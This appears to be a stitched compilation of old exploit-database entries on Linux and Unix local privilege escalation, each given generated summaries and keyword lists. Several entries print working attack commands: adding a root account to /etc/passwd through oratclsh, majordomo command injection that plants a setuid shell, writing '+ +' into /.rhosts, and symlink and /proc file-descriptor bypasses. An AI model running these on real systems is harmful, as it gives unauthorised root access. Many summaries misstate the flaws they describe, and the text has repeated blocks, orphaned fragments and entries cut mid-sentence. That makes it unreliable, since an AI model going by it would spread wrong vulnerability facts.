column2: # #<-- Publish Date --># # 2009-11-12 # #<-- Technical Document Summary (TDS) --># # The exploit uses a background process that pipes output to a subshell loop, then captures the PID of the sleep 1 command, calculates a random delay, and uses usleep to introduce variable sleep intervals before echoing a newline to standard output. This triggers a defect in the kernel's handling of file descriptors, as indicated by the comment "# Trigger defect". The mechanism relies on process substitution and timing manipulation via random delays. # #<-- Layman's Document Summary (LDS) --># # The weakness lies in improper handling of file descriptor interactions combined with predictable timing intervals, allowing an attacker to influence system processes through controlled sleep durations. An attacker can execute arbitrary commands by manipulating the delay values. This affects the Linux kernel's process management functionality. # #<-- Key Words (KW) --># # Linux Kernel 2.6.32, pipe.c, local privilege escalation, CVE-2009-3547, OSVDB-59654 # #<-- Related Terms --># # privilege escalation, sleep command, file descriptor, random delay, process substitution, kernel vulnerability, timing attack, exploit script # #<-- Entities/Attributes --># # Software: Linux Kernel 2.6.32 # Product: Linux # Operating System: Linux # Architecture: Not specified # Programming Language: Not specified # Protocol: Not applicable # File Paths: /proc/$OUT/fd/1 # Functions: ps, grep, read, echo, usleep # Versions: Not specified # #<-- Vulnerability Type --># # Not specified in source # #<-- Original Content --># while : ; do { echo y ; sleep 1 ; } | { while read ; do echo z$REPLY; done ; } & PID=$! OUT=$(ps -efl | grep 'sleep 1' | grep -v grep | { read PID REST ; echo $PID; } ) OUT="${OUT%% *}" DELAY=$((RANDOM * 1000 / 32768)) usleep $((DELAY * 1000 + RANDOM % 1000 )) echo n > /proc/$OUT/fd/1 # Trigger defect done

#<-- Publish Date --># 2009-10-23 #<-- Technical Document Summary (TDS) --># The vulnerability stems from a permission check mechanism in the Linux /proc filesystem that allows a user to bypass directory access controls by manipulating file descriptors. The affected component is the proc file system's handling of file descriptors, specifically through the read syscall on a file descriptor opened via /proc. This weakness permits an attacker to circumvent intended permission restrictions without requiring direct file write access. The exploit leverages the fact that the reopen operation does not validate reachability or enforce security checks beyond inode permissions. No successful exploitation is demonstrated in the source, only a theoretical scenario. #<-- Layman's Document Summary (LDS) --># The flaw is a Linux-specific permission bypass where a user can read from a file even if the directory is set to restrictive permissions. An attacker could use this to access files they should not normally have permission to view. This allows reading sensitive system information without needing elevated privileges or exploiting other vulnerabilities. #<-- Key Words (KW) --># proc file system, directory permissions, read syscall, inode permissions, chmod, file descriptor, Linux kernel, guest user, read A, reachability check, security bypass #<-- Related Terms --># proc filesystem, permission model, unix security mechanism, file descriptor, reachability, vulnerability classification #<-- Entities/Attributes --># Software: proc file system Version: Linux toy.ucw.cz 2.6.32-rc3 Author: Pavel Machek Type: local Platform: linux File path: /proc/PID/fd Function: read syscall, chmod operation #<-- Vulnerability Type --># Not specified in source #<-- Original Content --># Hi! This is forward from lkml, so no, I did not invent this hole. Unfortunately, I do not think lkml sees this as a security hole, so... Jamie Lokier said: > > > a) the current permission model under /proc/PID/fd has a security > > > hole (which Jamie is worried about) > > > > I believe its bugtraq time. Being able to reopen file with additional > > permissions looks like a security problem... > > > > Jamie, do you have some test script? And do you want your 15 minutes > > of bugtraq fame? ;-). > The reopen does check the inode permission, but it does not require > you have any reachable path to the file. Someone _might_ use that as > a traditional unix security mechanism, but if so it's probably quite rare. Ok, I got this, with two users. I guess it is real (but obscure) security hole. So, we have this scenario. pavel/root is not doing anything interesting in the background. pavel@toy:/tmp$ uname -a Linux toy.ucw.cz 2.6.32-rc3 #21 Mon Oct 19 07:32:02 CEST 2009 armv5tel GNU/Linux pavel@toy:/tmp mkdir my_priv; cd my_priv pavel@toy:/tmp/my_priv$ echo this file should never be writable > unwritable_file # lock down directory pavel@toy:/tmp/my_priv$ chmod 700 . # relax file permissions, directory is private, so this is safe # check link count on unwritable_file. We would not want someone # to have a hard link to work around our permissions, would we? pavel@toy:/tmp/my_priv$ chmod 666 unwritable_file pavel@toy:/tmp/my_priv$ cat unwritable_file

# lock down directory pavel@toy:/tmp/my_priv$ chmod 700 . # relax file permissions, directory is private, so this is safe # check link count on unwritable_file. We would not want someone # to have a hard link to work around our permissions, would we? pavel@toy:/tmp/my_priv$ chmod 666 unwritable_file pavel@toy:/tmp/my_priv$ cat unwritable_file this file should never be writable pavel@toy:/tmp/my_priv$ cat unwritable_file got you # Security problem here [Please pause here for a while before reading how guest did it.] Unexpected? Well, yes, to me anyway. Linux specific? Yes, I think so. So what did happen? User guest was able to work around directory permissions in the background, using /proc filesystem. guest@toy:~$ bash 3< /tmp/my_priv/unwritable_file # Running inside nested shell guest@toy:~$ read A <&3 guest@toy:~$ echo $A this file should never be writable guest@toy:~$ cd /tmp/my_priv guest@toy:/tmp/my_priv$ ls unwritable_file # pavel did chmod 000, chmod 666 here guest@toy:/tmp/my_priv$ ls ls: cannot open directory .: Permission denied # Linux correctly prevents guest from writing to that file guest@toy:/tmp/my_priv$ cat unwritable_file cat: unwritable_file: Permission denied guest@toy:/tmp/my_priv$ echo got you >&3 bash: echo: write error: Bad file descriptor # ...until we take a way around it with /proc filesystem. Oops. guest@toy:/tmp/my_priv$ echo got you > /proc/self/fd/3 Pavel -- (english) http://www.livejournal.com/~pavelmachek (cesky, pictures) http://atrey.karlin.mff.cuni.cz/~pavel/picture/horses/blog.html ----- End forwarded message ----- -- (english) http://www.livejournal.com/~pavelmachek (cesky, pictures) http://atrey.karlin.mff.cuni.cz/~pavel/picture/horses/blog.html

It writes a shell script that is executed by Geany after compilation. The vulnerability lies in the lack of validation when writing files, allowing an attacker to manipulate the execution flow. The affected component is the local file execution mechanism in Geany 0.18. #<-- Publish Date --># 2010-10-18 #<-- Technical Document Summary (TDS) --># The exploit leverages a flaw in the GNU C library dynamic linker where the $ORIGIN substitution sequence is expanded during library loading. This mechanism allows an attacker to control pathname resolution for setuid binaries when $ORIGIN appears alone and first in the search path. The vulnerability resides in glibc's dlopen() function, specifically in _dl_dst_substitute(), enabling arbitrary code execution as root through crafted suid binaries and LD_AUDIT manipulation. Affected versions include 2.12.1 (FC13) and 2.5 (RHEL5/CentOS5). The flaw does not appear to be useful even if ignored, though it is considered low impact for end users. #<-- Layman's Document Summary (LDS) --># This vulnerability allows an attacker to execute code as root by manipulating the dynamic linker's $ORIGIN expansion feature in setuid binaries via LD_AUDIT. It affects ELF-based systems using glibc on Linux, particularly older versions like 2.12.1 and 2.5. The issue stems from insufficient prevention of $ORIGIN substitution when used in isolation within the loader's path resolution logic. #<-- Key Words (KW) --># technical document summary, dynamic linker, $ORIGIN expansion, setuid binary, LD_AUDIT, glibc, privilege escalation, kernel security flaw, ELF substitution sequence, binary search path manipulation, root code execution, CVE-2010-3847, OSVDB-68721 #<-- Related Terms --># dynamic linker, ELF, setuid, privilege escalation, kernel security flaw, binary search path manipulation, CVE-2010-3847, OSVDB-68721, glibc, LD_AUDIT, root execution #<-- Entities/Attributes --># GNU C library (glibc), 2.12.1 (FC13), 2.5 (RHEL5/CentOS5), /proc/self/fd/3, _dl_init_paths, _dl_dst_substitute, _is_dst, dlopen, LD_AUDIT, setuid, ld.so, kernel, Linux, CVE-2010-3847 #<-- Vulnerability Type --># Not specified in source #<-- Original Content --># from: http://marc.info/?l=full-disclosure&m=128739684614072&w=2 The GNU C library dynamic linker expands $ORIGIN in setuid library search path ------------------------------------------------------------------------------ Gruezi, This is CVE-2010-3847. The dynamic linker (or dynamic loader) is responsible for the runtime linking of dynamically linked programs. ld.so operates in two security modes, a permissive mode that allows a high degree of control over the load operation, and a secure mode (libc_enable_secure) intended to prevent users from interfering with the loading of privileged executables. $ORIGIN is an ELF substitution sequence representing the location of the executable being loaded in the filesystem hierarchy. The intention is to allow executables to specify a search path for libraries that is relative to their location, to simplify packaging without spamming the standard search paths with single-use libraries. Note that despite the confusing naming convention, $ORIGIN is specified in a DT_RPATH or DT_RUNPATH dynamic tag inside the executable itself, not via the environment (developers would normally use the -rpath ld parameter, or -Wl,-rpath,$ORIGIN via the compiler driver). The ELF specification suggests that $ORIGIN be ignored for SUID and SGID binaries, http://web.archive.org/web/20041026003725/http://www.caldera.com/developers/gabi/2003-12-17/ch5.dynamic.html#substitution "For security, the dynamic linker does not allow use of $ORIGIN substitution sequences for set-user and set-group ID programs. For such sequences that appear within strings specified by DT_RUNPATH dynamic array entries, the specific search path containing the $ORIGIN sequence is ignored (though other search paths in the same string are processed). $ORIGIN sequences within a DT_NEEDED entry or path passed as a parameter to dlopen()

set-group ID programs. For such sequences that appear within strings specified by DT_RUNPATH dynamic array entries, the specific search path containing the $ORIGIN sequence is ignored (though other search paths in the same string are processed). $ORIGIN sequences within a DT_NEEDED entry or path passed as a parameter to dlopen() are treated as errors. The same restrictions may be applied to processes that have more than minimal privileges on systems with installed extended security mechanisms." However, glibc ignores this recommendation. The attack the ELF designers were likely concerned about is users creating hardlinks to suid executables in directories they control and then executing them, thus controlling the expansion of $ORIGIN. It is tough to form a thorough complaint about this glibc behaviour however, as any developer who believes they're smart enough to safely create suid programs should be smart enough to understand the implications of $ORIGIN and hard links on load behaviour. The glibc maintainers are some of the smartest guys in free software, and well known for having a "no hand-holding" stance on various issues, so I suspect they wanted a better argument than this for modifying the behaviour (I pointed it out a few years ago, but there was little interest). However, I have now discovered a way to exploit this. The origin expansion mechanism is recycled for use in LD_AUDIT support, although an attempt is made to prevent it from working, it is insufficient. LD_AUDIT is intended for use with the linker auditing api (see the rtld-audit manual), and has the usual restrictions for setuid programs as LD_PRELOAD does. They continue to avoid hundreds of security vulnerabilities each year thanks to their insight into systems security. http://www.openwall.com/owl/ ------------------- Notes ----------------------- There are several known techniques to exploit dynamic loader bugs for suid binaries, the fexecve() technique listed in the Consequences section above is a modern technique, making use of relatively recent Linux kernel features (it was first suggested to me by Adam Langley while discussing CVE-2009-1894, but I believe Gabriel Campana came up with the same solution independently). The classic UNIX technique is a little less elegant, but has the advantage that read access is not required for the target binary. It is rather common for administrators to remove read access from suid binaries in order to make attackers work a little harder, so I will document it here for reference. The basic idea is to create a pipe(), fill it up with junk (pipes have 2^16 bytes capacity on Linux, see the section on "Pipe Capacity" in pipe(7) from the Linux Programmers Manual), then dup2() it to stderr. Please see http://seclists.org/fulldisclosure/2010/Oct/257 for background information. For obvious reasons, the dynamic linker will ignore requests to preload user specified libraries for setuid/setgid programs. However, it is possible to imagine legitimate use cases for this functionality, so the glibc developers provide an exception to this rule. LD_PRELOAD A whitespace-separated list of additional, user-specified, ELF shared libraries to be loaded before all others. This can be used to selectively override functions in other shared libraries. For set-user-ID/set-group-ID ELF binaries, only libraries in the standard search directories that are also set- user-ID will be loaded. In order to be preloaded during the execution of a privileged program, a library must be setuid and in the trusted library search path. This is a reasonable design, before a library will be loaded, the system administrator must brand a library as safe to load across privilege boundaries. This feature allows developers who design their programs to operate safely while running as setuid to opt-in to doing so. Bizarrely, the same conditions do not apply to LD_AUDIT, which will load an arbitrary DSO, regardless of whether it has been designed to operate safely or not. While the dynamic loader will only use a library that exports the dynamic symbols required by the rtld-auditing API, it must first dlopen() the library in order to examine the exported symbols. By definition, this must execute any defined initialization routines. This confusion can be exploited by locating a DSO in the trusted search path with initialization code that has not been designed to operate safely while euid != uid. See the Notes section below for additional discussion on this topic. -------------------- Affected Software ------------------------ At least the following versions have been tested 2.12.1, FC13 2.5, RHEL5 / CentOS5 2.11.1, Ubuntu 10 EDB Note: 2.7, Debian 5 -------------------- Consequences ----------------------- This is a low impact issue that is only of interest to security professionals and system administrators, end users do not need to be concerned. It is possible to exploit this confusion to execute arbitrary code as root. #<-- Publish Date --># 2011-01-31 #<-- Technical Document Summary (TDS) --># OpenVAS Manager is vulnerable to command injection due to insufficient validation of user-supplied data when processing OMP requests. The flaw permits privilege escalation for authenticated users by allowing crafted POST requests that manipulate the email() function call. Affected components include OpenVAS Manager and the Greenbone Security Assistant web application used for remote exploitation. The vulnerability is classified as a command injection issue with medium risk, documented in CVE-2011-0018. A patch was released in version 1.0.4 to mitigate the flaw. The exploit leverages the email() function within manage_sql.c to execute arbitrary commands on the system. Not specified in source. #<-- Layman's Document Summary (LDS) --># The weakness involves improper validation of input data, enabling an attacker to inject malicious commands through crafted request fields. This allows an authenticated user to elevate their privileges or potentially run arbitrary code on vulnerable systems. The issue resides in OpenVAS Manager and can be triggered via direct exploitation or cross-site request forgery attacks. #<-- Key Words (KW) --># OpenVAS Manager command injection, privilege escalation, input validation flaw, email() function, OMP requests, CVE-2011-0018 #<-- Related Terms --># command injection, privilege escalation, OpenVAS, Greenbone Security Assistant, sendmail, authentication bypass, cross-site request forgery, SQL command execution #<-- Entities/Attributes --># Software: OpenVAS Manager, Greenbone Security Assistant, OpenVAS Versions: 1.0.3, 2.0rc2 Vendor: OpenVAS Operating System: Linux Protocols: OMP (OpenVAS Management protocol), SMTP (sendmail) File Paths: /var/lib/openvas/users/alexander/isadmin Functions: email(), system(), g_strdup_printf() CVE Identifier: CVE-2011-0018 #<-- Vulnerability Type --># Command injection #<-- Original Content --># Source: http://securityreason.com/securityalert/8048 Summary It has been identified that OpenVAS Manager is vulnerable to command injection due to insufficient validation of user supplied data when processing OMP requests. It has been identified that this vulnerability allows privilege escalation within the OpenVAS Manager but more complex injection may allow arbitrary code to be executed with the privileges of the OpenVAS Manager on vulnerable systems. CVE-2011-0018 has been assigned to this vulnerability. Not specified in source. #<-- Key Words (KW) --># PLESK 9, directory permissions, insecure path resolution, mysql dump, password extraction, backup process, sudo privilege escalation, file system traversal, osdiff vulnerability, Ubuntu, CentOS, psadump.log, admin password disclosure #<-- Related Terms --># directory traversal, insecure default permissions, credential leakage, log analysis, local privilege escalation, parallels plesk, mysql dump command line, file path resolution, security misconfiguration, osvdb vulnerability #<-- Entities/Attributes --># Software: PLESK 9.x, MySQL, psadump.log, Ubuntu, CentOS Version: 9.x File paths: /opt/psa/PMM/sessions, /usr/local/psa/PMM/sessions Processes: mysqldump Permissions: readable by all, insecure directory permissions #<-- Vulnerability Type --># Path traversal leading to information disclosure via improper file permission settings. #<-- Original Content --># # Exploit Title: PLESK 9.x insecure directory permission ( admin password revealed ) # Date: 25/04/2012 # Author: Nicolas Krassas , twitter.com/dinosn # Software Link: www.*parallels*.com/*plesk*/ # Version: 9.x # Tested on: ubuntu / centos During backup procedures, PLESK panel is keeping a detailed log of the process under /opt/psa/PMM/sessions in Debian/Ubuntu installations and /usr/local/psa/PMM/sessions in Centos under the directory with the current date. #<-- Publish Date --># 1998-07-13 #<-- Technical Document Summary (TDS) --># The vulnerability stems from a missing /etc/group file during login on Slackware Linux 3.5 when using shadow passwords. When initgroups() fails, setup_uid_gid() returns -1 but the function does not validate this result, allowing uid and gid to default to 0. This permits unauthenticated users to gain root privileges by logging in without a valid group membership file. The flaw affects all Slackware versions with shadow passwords up to 3.5. The exploit relies on the absence of /etc/group rather than direct code manipulation. It is classified as a local privilege escalation issue. Not specified in source. #<-- Layman's Document Summary (LDS) --># Because the system's password shadowing setup fails silently when /etc/group is missing, an attacker can log in without proper credentials and receive root access. This allows unrestricted access to the machine by bypassing normal user authentication checks. The problem lies in Slackware's handling of missing group files during user login. Not specified in source. #<-- Key Words (KW) --># Slackware Linux 3.5, /etc/group, uid, gid, shadow passwords, privilege escalation, local privilege escalation, missing file, login bypass, CVE-1999-1434 #<-- Related Terms --># privilege escalation, local authentication bypass, missing configuration file, root access, group file, shadow password, operating system vulnerability, Linux security flaw #<-- Entities/Attributes --># Software: Slackware Linux 3.5, Function: setup_uid_gid, Attribute: return value not validated, File: /etc/group, Vulnerability: missing group file during login, Version: 3.5, CVE: CVE-1999-1434 #<-- Vulnerability Type --># Local privilege escalation due to unchecked return value in setup_uid_gid function when /etc/group is absent. #<-- Original Content --># source: https://www.securityfocus.com/bid/155/info Due to the way /bin/login behaves when a /etc/group file is not present under Slackware's version of the password shadowing suite, users who log in while this file is not present will be given uid and gid 0. This will allow them unrestricted access to the machine. This vulnerability is present in all versions of Slackware which have shadow passwords, up to and including 3.5 If the call to initgroups() fails in setup_uid_gid(), the function immediately returns value of -1. However, the call to setup_uid_gid() in login.c fails to check this return value. Since the uid and gid were not checked, their value is still 0, and the user will be logged in with 0 as their uid and gid. Remove /etc/group and log in as a valid user. /etc/group must entirely not exist -- mode 000 is not sufficient.

#<-- Publish Date --># 1999-04-29 #<-- Technical Document Summary (TDS) --># The exploit leverages a setuid root binary (oratclsh) installed during Oracle 8 installation. It sets the suid bit on oratclsh and then executes it as root to run arbitrary TCL commands. This allows an attacker, after gaining root access via the installation process, to execute system-level commands with elevated privileges. #<-- Layman's Document Summary (LDS) --># The weakness is a setuid root vulnerability in Oracle 8's Internet Agent installation. An attacker can exploit this by obtaining root access and using the suid binary to run arbitrary TCL commands as root. This enables full system compromise once the installation process fails to properly enforce the setuid bit. #<-- Key Words (KW) --># Oracle 8, oratclsh, setuid, root, suid, Internet Agent, exploit, privilege escalation, TCL, vulnerability, CVE-1999-0711 #<-- Related Terms --># setuid binary, privilege escalation, command execution, Oracle database, TCL scripting, root access, intruder user, system command, exploitation technique #<-- Entities/Attributes --># Software: Oracle 8, oratclsh, dbsnmp, /etc/passwd, /etc/shadow, intruder user, uid=0(root), gid=1(other) #<-- Vulnerability Type --># Not specified in source #<-- Original Content --># source: https://www.securityfocus.com/bid/159/info Oracle8 is an enterprise level database. As part of the Internet Agent option installation process it installs the file $ORACLE_HOME/bin/oratclsh as suid root. oratclsh is a TCL application that provides full access to TCL. oratclsh gives anyone the ability to execute arbitrary TCL commands as root. The suid root bit gets set when the post install script "root.sh" is executed as root as directed in the installation instructions. If the "root.sh" script is not executed as root after installing the Intelligent Agent the oratclsh will be owned by the installation user (typically oracle). Although not as degerous as suid root, a suid oracle oratclsh script would allow a malicious user to obtain full acess to the database. The offending core in "root.sh": # Setuid to root for oemagent executables /bin/chown root /oracle/bin/dbsnmp /bin/chmod u+s /oracle/bin/dbsnmp /bin/chown root /oracle/bin/oratclsh /bin/chmod u+s /oracle/bin/oratclsh ./oratclsh % set f [open "/etc/passwd" "a+"] % puts $f "intruder:x:0:1:intruder:/tmp/intruder:/bin/sh" % close $f % set f [open "/etc/shadow" "a+"] % puts $f "intruder::::::::" % close $f % exit $ su - intruder $ id uid=0(root) gid=1(other)

#<-- Publish Date --># 1999-06-02 #<-- Technical Document Summary (TDS) --># The technical mechanism involves the zsoelim utility generating predictable temporary filenames under /tmp and following symlinks to create arbitrary files. This vulnerability stems from a failure to check for symlink existence, allowing malicious users to write files with controlled names. The affected component is the man package's zsoelim binary within the Linux operating system. The exploit enables an attacker to create files with arbitrary permissions based on the user executing the man command. Not specified in source. #<-- Layman's Document Summary (LDS) --># The weakness allows an attacker to create arbitrary files on the system by exploiting a symlink handling flaw in the man utility. This can lead to unauthorized file creation or potential privilege escalation depending on the context. The exploit targets the Linux-based man package implementation. Not specified in source. #<-- Key Words (KW) --># man, zsoelim, symlink, temporary file, process ID, /tmp, predictable naming, permission manipulation, OSVDB-6204, CVE-1999-0730 #<-- Related Terms --># symlink, privilege escalation, file creation, Unix, temporary files, vulnerability, man page utility, process identification number #<-- Entities/Attributes --># Software: zsoelim, man package, Linux, /tmp directory, symlink, process ID, CVE-1999-0730 #<-- Vulnerability Type --># Path traversal, privilege escalation, arbitrary file creation #<-- Original Content --># source: https://www.securityfocus.com/bid/305/info The man command created a temporary file under /tmp with a predictable name and is willing to follow symbolic links. This may allow malicious local users to create arbitrarily named files. zsoelim(1) is a utility part of the man package which prepocess man pages and satisfy .so requests in roff input. This utility may be called when running the man(1) command. It creates temporary filenames are of the form "/tmp/zman0<pid>aaa" where <pid> is the process id of the zsoelim process. The program fails to check for the existance of symlinks and follows them creating arbitrary files with the permissions of the user running man. perl -e 'for($i=1000;$i<5000;$i++){symlink "/etc/nologin", "/tmp/zman0${i}aaa";}'

#<-- Publish Date --># 1999-08-25 #<-- Technical Document Summary (TDS) --># The vulnerability stems from improper validation of a user-supplied environment variable by the vixie cron daemon, enabling arbitrary command execution as root. This flaw allows an attacker to inject malicious arguments into the sendmail command while running with elevated privileges. Affected components include the cron daemon and the sendmail binary on Caldera OpenLinux 2.2, Debian Linux 2.1/2.2, RedHat <=6.0 Vixie Cron. The exploit leverages the MAILTO variable to bypass authentication and obtain root access. No successful exploitation is demonstrated in the source; only the potential for unauthorized command execution is described. #<-- Layman's Document Summary (LDS) --># A weakness exists where the cron daemon does not properly sanitize user input from the MAILTO environment variable, allowing malicious commands to be passed to sendmail. This allows a local attacker to execute arbitrary commands with root privileges. The affected component is the vixie cron daemon and the sendmail program on Unix-like systems. #<-- Key Words (KW) --># Caldera OpenLinux, Debian Linux, RedHat, MAILTO, sendmail, Cron, environment variable, command injection, root access, Vixie Cron, local privilege escalation #<-- Related Terms --># exploit, vulnerability, authentication bypass, command execution, Unix, operating system, mailto, cron daemon, sendmail, local user, privilege escalation #<-- Entities/Attributes --># Software: Caldera OpenLinux 2.2, Debian Linux, RedHat 6.0, Vixie Cron, sendmail Version: Not specified in source CVE: Not specified in source Protocol: Not specified in source File path: /tmp/myexploitsendmail.cf #<-- Vulnerability Type --># Not specified in source #<-- Original Content --># Caldera OpenLinux 2.2 ,Debian Linux 2.1/2.2,RedHat Linux <= 6.0 Vixie Cron MAILTO Sendmail Vulnerability source: https://www.securityfocus.com/bid/611/info Failure by the vixie cron daemon from validating the contents of a user supplied environment variable allow a malicious users to pass arbitrary command line arguments to sendmail while running as the root user. The cron daemon uses the cron_popen function to send email to the user that queue commands for execution by cron. The user can set a MAILTO environment variable before calling cron to have it send the email to a different address. #<-- Publish Date --># 1999-12-28 #<-- Technical Document Summary (TDS) --># Arbitrary command execution can be achieved by exploiting a setuid root wrapper program that invokes the majordomo binary's resend function. The vulnerability lies in an unvalidated input string passed to an open() system call within resend, allowing injection of shell commands when prefixed with a pipe character. This allows elevated privilege execution without authentication bypass or additional user interaction. #<-- Layman's Document Summary (LDS) --># The weakness is that the majordomo binary's resend command does not validate its first argument before passing it to an open() system call, enabling command injection if the input begins with a pipe symbol. The affected component is the Majordomo 1.94.4 binary on Linux systems. #<-- Key Words (KW) --># Majordomo, resend, setuid root wrapper, arbitrary command execution, command injection, Linux, open(), pipe character, local vulnerability #<-- Related Terms --># setuid, privilege escalation, command line argument parsing, Majordomo, binary exploitation, elevated privileges, Linux kernel, open system call, shell injection #<-- Entities/Attributes --># Software: Majordomo version 1.94.4, Platform: Linux, File path: /usr/local/majordomo/resend, Function: open(), Command line argument: '@|cp /bin/ksh', Vulnerable component: resend binary #<-- Vulnerability Type --># Not specified in source #<-- Original Content --># source: https://www.securityfocus.com/bid/902/info It is possible to execute arbitrary commands with elevated privileges through exploiting the majordomo binary, "resend". A setuid root wrapper program calls resend after setuid()ing and setgid()ing to lowered (but still elevated) privileges which it runs resend with. resend contains a call to open() (it is a perl script), which can be made to execute shell commands if a '|' is the first character it is passed, so if the first parameter to resend is '@|shell;commands;here', the shell commands will be executed with resend's privileges. bash-2.02$ /usr/local/majordomo/wrapper resend '@|cp /bin/ksh /tmp/xnec;chmod 6555 /tmp/xnec' resend: must specify '-l list' at /usr/local/majordomo/resend line 77. bash-2.02$ ls -la /tmp/xnec -r-sr-sr-x 1 owner daemon 361688 Dec 29 06:26 /tmp/xnec

# #<-- Publish Date --># # 2000-01-04 # #<-- Technical Document Summary (TDS) --># # The vulnerability stems from double path handling in userhelper and PAM on RedHat 6.0/6.1 systems. It allows an attacker to execute arbitrary code by specifying a path traversal sequence that leads to dlopen execution of a setuid binary with elevated privileges. The flaw enables local root compromise through crafted configuration files. Affected components include the binary userhelper, PAM library, and Mandrake Turbolinux versions 6.0/6.1 and TurboLinux 6.0.2. Not specified in source: No CVE identifier provided. # #<-- Layman's Document Summary (LDS) --># # Because of double path vulnerabilities in the binary userhelper and PAM, it is possible to get root locally on RedHat 6.0 and 6.1 systems. Both userhelper and PAM follow ".." paths and userhelper allows you to specifiy a program to execute as an argument to the -w parameter (which is expected to have an entry in /etc/security/console.apps). Because of this, it's possible to specifiy a program such as "../../../tmp/myprog", which would (to userhelper) be "/etc/security/console.apps/../../../tmp/myprog". If "myprog" exists, PAM will then try to execute it (with the same filename). PAM first does a check to see if the configuration file for "../../../tmp/myprog" is in /etc/pam.d/ but also follows ".." directories -- to an attacker's custom pam configuration file. Specified inside the malicious configuration file (/tmp/myprog) would be arbitrary shared libraries to be opened with setuid privileges. The arbitrary libraries can be created by an attacker specifically to compromise superuser access, activating upon dlopen() by PAM. #<-- Publish Date --># 2000-02-01 #<-- Technical Document Summary (TDS) --># The vulnerability resides in the apcd package of Debian GNU/Linux 2.1, where sending a SIGUSR1 signal to the apcd process creates an upsstat file in /tmp without proper security restrictions. An attacker can craft a symlink with this name to manipulate file access, potentially leading to privilege escalation or root compromise. The mechanism exploits insecure handling of user‑controlled file paths and lack of secure permission enforcement. Affected component: apcd package; vulnerability type: insecure symlink creation leading to potential privilege escalation. #<-- Layman's Document Summary (LDS) --># This flaw allows an attacker to create a symlink that could be used to influence system behavior or gain unauthorized access. It stems from the lack of secure file permission checks when handling paths provided by untrusted input. The issue impacts the Debian 2.1 distribution using the apcd utility for APC power supply monitoring. #<-- Key Words (KW) --># apcd, Symlink, SIGUSR1, upsstat, APC, privilege escalation, Debian, Linux, file path security, rsh, root #<-- Related Terms --># symlink, insecure symlink creation, privilege escalation, Debian, apcd, SIGUSR1, APC, file permissions #<-- Entities/Attributes --># apcd package, Debian GNU/Linux 2.1, SIGUSR1 signal, /tmp/upsstat, /.rhosts, rsh, root account #<-- Vulnerability Type --># Not specified in source #<-- Original Content --># source: https://www.securityfocus.com/bid/958/info A vulnerability exists in the apcd package, as shipped in Debian GNU/Linux 2.1. #<-- Publish Date --># 2000-02-24 #<-- Technical Document Summary (TDS) --># The document describes a vulnerability in the buildxconfig program included with Corel Linux 1.0 that allows local privilege escalation through improper input validation of command-line arguments. The flaw stems from failing to check user-supplied filenames for malicious content, enabling an attacker to modify or create files with elevated permissions. This weakness permits appending data to existing files or creating new files with read, write, and execute permissions. The exploit leverages the -f flag to append information to a file or the -x flag to replace the first line of any specified file. Not specified in source. #<-- Layman's Document Summary (LDS) --># A local user could gain elevated privileges by using buildxconfig with improperly validated filename arguments. This vulnerability allows an attacker to modify system files such as /etc/shadow and /etc/passwd, or create new files with full permissions on the system. #<-- Key Words (KW) --># Corel Linux, buildxconfig, privilege escalation, input validation, -f flag, -x flag, file creation, read write execute, CVE-2000-0194 #<-- Related Terms --># exploit, vulnerability, privilege escalation, command line argument parsing, local privilege, Linux kernel, file manipulation, security flaw #<-- Entities/Attributes --># Software: Corel Linux 1.0, program: buildxconfig, flag: -f, flag: -x, file paths: /etc/shadow, /etc/passwd, .rhosts, umask, read, write, execute #<-- Vulnerability Type --># Privilege escalation via command line argument processing flaw in buildxconfig. #<-- Original Content --># source: https://www.securityfocus.com/bid/1007/info Several vulnerabilities exist in the buildxconfig program, as included with Corel Linux 1.0. Using this program, it is likely that a local user could elevate privileges. By failing to check input to the -f and -x flags, it is possible for an attacker to append to existing files, or create files that previously didn't exist. Using the -f argument, and supplying a filename that does exist, it is possible to append information to a file. Using the -x argument, and a file that does exist, it is possible toreplace the first line of any file with the path to the X server selected. Finally, if either flag is passed the name of a file that does not exist, it will create it, with read, write and execute permission available for all users on the system. Method 1: buildxconfig -f /etc/shadow Method 2: buildxconfig -x /etc/passwd Method 3: umask 0 buildxconfig -x /.rhosts echo "+ +" > /.rhosts

#<-- Publish Date --># 2000-02-24 #<-- Technical Document Summary (TDS) --># The vulnerability resides in the setxconf utility included with Corel Linux 1.0. The -T option invokes xinit, which runs as the effective user ID (euid) of root. Executing xinit triggers the contents of ~/.xserverrc, allowing a malicious user to write configuration files that are subsequently read by root. This mechanism enables privilege escalation without authentication. #<-- Layman's Document Summary (LDS) --># The weakness is that the setxconf utility does not validate the user context when processing the -T option, permitting a non‑root user to modify system configuration files. An attacker can then execute arbitrary commands as root by placing malicious code in those files. #<-- Publish Date --># 2000-03-05 #<-- Technical Document Summary (TDS) --># The exploit leverages a race condition where the Oracle installation script creates a directory and shell script without verifying existing files, allowing an attacker to replace the script via a symlink. This enables privilege escalation by creating a .rhosts file or executing arbitrary commands as root. The vulnerability resides in the installation process of Oracle 8.1.5i on Linux/Intel systems. #<-- Layman's Document Summary (LDS) --># An attacker can create a symbolic link from a temporary directory to a user-controlled location, such as /etc/hosts, to redirect system traffic. This allows unauthorized access to root privileges or arbitrary command execution when the symlink is followed by privileged processes. #<-- Key Words (KW) --># Oracle8i Standard Edition 8.1.5, Linux/Intel, local privilege escalation, symbolic link, race condition, installation script, /tmp/orainstall, orainstRoot.sh, CVE-2000-0206 #<-- Related Terms --># vulnerability, privilege escalation, symlink attack, race condition, software installation, root access, operating system, Linux, Oracle Database #<-- Entities/Attributes --># Software: Oracle8i Standard Edition 8.1.5 Version: 8.1.5i Platform: Linux/Intel File path: /tmp/orainstall/orainstRoot.sh Directory permissions: 711 Script permissions: 777 CVE identifier: CVE-2000-0206 #<-- Vulnerability Type --># Not specified in source #<-- Original Content --># source: https://www.securityfocus.com/bid/1035/info A vulnerability exists in the installation program for Oracle 8.1.5i. The Oracle installation scripts will create a directory named /tmp/orainstall, owned by oracle:dba, mode 711. Inside of this directory it will create a shell script named orainstRoot.sh, mode 777. The installation script will then stop and ask the person installing to run this script. The installation program at no point attempts to determine if the directory or script already exist. This makes it possible to create a symbolic link from the orainstRoot.sh file to elsewhere on the file system. This could be used to create a .rhosts file, for instance, and gain access to the root account. Again, this can result in the compromise of the root account. It is not readily apparent what versions of Oracle this does and does not affect. #<-- Publish Date --># 2000-04-21 #<-- Technical Document Summary (TDS) --># OpenLDAP creates a symbolic link at /usr/tmp that points to a world-writable directory. This allows an attacker to cause arbitrary file deletion by targeting the symlink. The flaw stems from insufficient validation of filesystem paths before opening them. Affected systems include RedHat 6.1/6.2, TurboLinux 6.0.2 and earlier, and any Unix system with 